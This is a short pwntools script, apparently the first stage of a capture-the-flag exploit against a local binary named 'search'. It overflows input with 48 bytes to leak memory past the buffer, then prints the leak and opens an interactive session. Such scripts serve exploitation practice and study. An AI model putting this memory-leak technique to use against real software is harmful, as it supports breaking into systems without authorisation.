#coding:utf-8

from pwn import *

context(arch="amd64", os="linux")

p = process("./search")

p.sendline("A"*48)
leak = p.recvline().split(' ')[1][48:]
print(leak)
#print(int(leak[::-1].encode('hex'), 16))
p.interactive()
#gdb.attach(p)

